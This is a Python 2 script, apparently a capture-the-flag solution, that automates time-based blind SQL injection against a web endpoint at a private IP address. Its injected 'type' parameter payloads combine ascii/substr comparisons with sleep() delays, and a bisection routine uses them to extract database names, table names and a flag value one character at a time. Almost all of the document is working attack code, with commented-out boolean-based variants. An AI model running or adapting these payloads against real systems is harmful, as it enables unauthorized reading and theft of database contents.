import requests
import time
flag_length=681
url='http://172.28.100.10/wanzhong/'
# payload_db="?id=1' and ascii(substr((select schema_name from information_schema.schemata limit {},1),{},1))>={}%23"
# payload_t="?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='{}' limit {},1),{},1))>={}%23"
# payload_c="?id=1' and ascii(substr((select column_name from information_schema.columns where table_name='{}' limit {},1),{},1))>={}%23"
payload_db="?type=18' and ascii(substr((select schema_name from information_schema.schemata limit {},1),{},1))>={} and sleep(0.5)='1"
payload_t="?type=18' and ascii(substr((select table_name from information_schema.tables where table_schema='{}' limit {},1),{},1))>={} and sleep(1)='0"
# payload_c="?type=18'  and ascii(substr((select column_name from information_schema.columns where table_name='{}' limit {},1),{},1))>={} and sleep(1)='0"
payload_c="?type=18' and ascii(substr((select flag from {} limit {},1),{},1))>={} and sleep(1)='0"
def bisection(payloadx,i,position):
    # chars=['@','0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','_']#,'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
    chars=range(31,127)
    index=len(chars)//2
    while index!=0:
        c=chars[index]
        payload=payloadx.format(i,position,c)
        print payload
        t=time.time()
        request=requests.get(url+payload)
        # if len(request.text)==flag_length:
        if time.time()-t>1:
            chars=chars[index:]
        else:
            chars=chars[:index]
        index=len(chars)//2
        request.close()
    return chr(chars[0])

def getNames(payload):
    names=[]
    i=1
    while True:
        j=64
        name=bisection(payload,i,j)
        # print name
        if name=='\x1f':
            return names
        while name[-1]!='\x1f':
            j+=1
            name+=bisection(payload,i,j)
            print(name[0:-1])
        names.append(name[0:-1])
        i+=1

def getDbs():
    return(getNames(payload_db))

def getTables(db):
    payload=payload_t.format(db,'{}','{}','{}')
    return getNames(payload)
def getColumns(table):
    payload=payload_c.format(table,'{}','{}','{}')
    return getNames(payload)

# print getDbs()
# print map(getTables,getDbs())
print getColumns('flag')

"""xe5xa5xbdxe5xa5xbdxe5xadxa6xe4xb9xa0xefxbcx8cxe5xa4xa9xe5xa4xa9xe5x90x91xe4xb8x8a"""
"""https://gitee.com/wctf/PEST/tree/master/CTF/flag"""



